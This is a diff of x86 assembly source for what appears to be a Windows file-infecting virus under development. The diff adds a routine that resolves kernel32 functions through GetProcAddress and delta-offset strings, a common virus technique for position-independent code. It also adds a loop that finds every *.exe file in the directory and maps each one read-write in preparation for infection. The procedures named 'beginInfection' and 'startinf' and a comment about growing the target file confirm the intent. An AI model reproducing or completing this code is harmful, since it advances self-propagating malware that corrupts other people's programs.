@@ -5,7 +5,7 @@
 option casemap:none
 
       include windows.inc
-      include user32.inc
+      ;include user32.inc
 	  include kernel32.inc
 
 	  include handle_file.inc
@@ -23,6 +23,15 @@ main:
 
 	mov ebx, [esp]
 	jmp startinf
+
+loadproc	macro dest, hmodule, loadproc, strproc
+	push eax
+	push strproc
+	push hmodule
+	call loadproc
+	mov dest, eax
+	pop eax
+			endm
 
 movloc	macro	dest, src
 
@@ -152,6 +161,131 @@ endfindprocfail:
 	ret
 getExportedProcAddr endp
 
+filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword
+	local findFileData:WIN32_FIND_DATA
+	local searchHandle:dword
+	local fileHandle:dword
+	local fileMapping:dword
+	local fileView:dword
+	
+	local prcFindFirstFile:dword
+	local prcFindNextFile:dword
+	local prcFindClose:dword
+	local prcCreateFile:dword
+	local prcCreateFileMapping:dword
+	local prcMapViewOfFile:dword
+	local prcUnmapViewOfFile:dword
+	local prcCloseHandle:dword
+
+	jmp filesLoopInit
+
+	PatternStr				db "*.exe",0 ; As a side note, Jambi is started in our /trunk/jambi/ so add an exe there if you want this to work
+	strFindFirstFile		db "FindFirstFileA",0
+	strFindNextFile			db "FindNextFileA",0
+	strFindClose			db "FindClose",0
+	strCreateFile			db "CreateFileA",0
+	strCreateFileMapping	db "CreateFileMappingA",0
+	strMapViewOfFile		db "MapViewOfFile",0
+	strUnmapViewOfFile		db "UnmapViewOfFile",0
+	strCloseHandle			db "CloseHandle",0
+
+filesLoopInit:
+
+	loadproc prcFindFirstFile, k32hmodule, prcGetProcAddr, offset strFindFirstFile
+	loadproc prcFindNextFile, k32hmodule, prcGetProcAddr, offset strFindNextFile
+	loadproc prcFindClose, k32hmodule, prcGetProcAddr, offset strFindClose
+	loadproc prcCreateFile, k32hmodule, prcGetProcAddr, offset strCreateFile
+	loadproc prcCreateFileMapping, k32hmodule, prcGetProcAddr, offset strCreateFileMapping
+	loadproc prcMapViewOfFile, k32hmodule, prcGetProcAddr, offset strMapViewOfFile
+	loadproc prcUnmapViewOfFile, k32hmodule, prcGetProcAddr, offset strUnmapViewOfFile
+	loadproc prcCloseHandle, k32hmodule, prcGetProcAddr, offset strCloseHandle
+
+	;invoke FindFirstFile, offset PatternStr, addr findFileData
+	lea edi, findFileData
+	push edi
+	push offset PatternStr
+	call prcFindFirstFile
+
+	cmp eax, INVALID_HANDLE_VALUE
+	je filesFinished ; we are fucked
+	mov searchHandle, eax
+	
+fileMainLoop:
+	
+	;invoke prcCreateFile, addr findFileData.cFileName, GENERIC_READ or GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0
+	lea edi, findFileData.cFileName
+	push 0
+	push 0
+	push OPEN_EXISTING
+	push 0
+	push 0
+	push GENERIC_READ or GENERIC_WRITE
+	push edi
+	call prcCreateFile
+
+	cmp eax, INVALID_HANDLE_VALUE
+	je fileNext
+	mov fileHandle, eax
+
+	;invoke prcCreateFileMapping, fileHandle, 0, PAGE_READWRITE, 0, 0, 0 ; This is where we have to change the size of our program.
+	push 0
+	push 0
+	push 0
+	push PAGE_READWRITE
+	push 0
+	push fileHandle
+	call prcCreateFileMapping
+
+	cmp eax, 0
+	je fileClose
+	mov fileMapping, eax
+
+
+	;invoke prcMapViewOfFile, fileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
+	push 0
+	push 0
+	push 0
+	push FILE_MAP_ALL_ACCESS
+	push fileMapping
+	call prcMapViewOfFile
+	cmp eax, 0
+	je fileMapClose
+	mov fileView, eax
+
+	; fileView now points toward an array representing our file
+
+	;invoke prcUnmapViewOfFile, fileView
+	push fileView
+	call prcUnmapViewOfFile
+
+fileMapClose:
+	;invoke prcCloseHandle, fileMapping
+	push fileMapping
+	call prcCloseHandle
+
+fileClose:
+	;invoke prcCloseHandle, fileHandle
+	push fileHandle
+	call prcCloseHandle
+
+fileNext:
+	;invoke prcFindNextFile, searchHandle, addr findFileData
+	lea edi, findFileData
+	push edi
+	push searchHandle
+	call prcFindNextFile
+
+	cmp eax, 0
+	jne fileMainLoop
+
+fileNoMore:
+	;invoke prcFindClose, searchHandle
+	push searchHandle
+	call prcFindClose
+
+filesFinished:
+	ret
+filesLoop endp
 
 beginInfection proc delta:dword
 	local K32PEHeaderAddr:dword
@@ -170,6 +304,7 @@ beginInfectionStr:
 	User32DllStr	db "User32.dll",0		; + 0Fh
 	MessageBoxStr	db "MessageBoxA",0		; + 0Bh
 	TitleStr		db "Done !",0			; + 0Ch
+	Kernel32Dllstr	db "Kernel32.dll",0		; + 07h
 
 Kernel32Init:
 	mov eax, [esp]
@@ -206,74 +341,24 @@ Kernel32Init:
 	push 0
 	call procMessageBox
 
+	add localDelta, 07h
+	push localDelta
+	call procLoadLibrary
+
+	invoke filesLoop, eax, procGetProcAddress
+
+
+
 	ret
 beginInfection endp
 
-filesLoop proc
-	local findFileData:WIN32_FIND_DATA
-	local searchHandle:dword
-	local fileHandle:dword
-	local fileMapping:dword
-	local fileView:dword
-	
-	jmp filesLoopInit
 
-	PatternStr	db "*.exe",0 ; As a side note, Jambi is started in our /trunk/jambi/ so add an exe there if you want this to work
-
-filesLoopInit:
-	invoke FindFirstFile, offset PatternStr, addr findFileData
-	cmp eax, INVALID_HANDLE_VALUE
-	je filesFinished ; we are fucked
-	mov searchHandle, eax
-	
-fileMainLoop:
-	
-	invoke CreateFile, addr findFileData.cFileName, GENERIC_READ or GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0
-	cmp eax, INVALID_HANDLE_VALUE
-	je fileNext
-	mov fileHandle, eax
-
-	invoke CreateFileMapping, fileHandle, 0, PAGE_READWRITE, 0, 0, 0 ; This is where we have to change the size of our program.
-	cmp eax, 0
-	je fileClose
-	mov fileMapping, eax
-
-	invoke MapViewOfFile, fileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
-	cmp eax, 0
-	je fileMapClose
-	mov fileView, eax
-
-	; fileView now points toward an array representing our file
-
-	invoke UnmapViewOfFile, fileView
-
-fileMapClose:
-	invoke CloseHandle, fileMapping
-
-fileClose:
-	invoke CloseHandle, fileHandle
-	
-fileNext:
-	invoke FindNextFile, searchHandle, addr findFileData
-	cmp eax, 0
-	jne fileMainLoop
-
-fileNoMore:
-	invoke FindClose, searchHandle
-
-filesFinished:
-	ret
-filesLoop endp
 
 startinf:
 
 	xor eax, eax
 	;invoke extractKernel32PEHeader, ebx
 	invoke beginInfection, ebx
-
-	invoke filesLoop
-
-endmloop:
 
 	ret
 endfile:
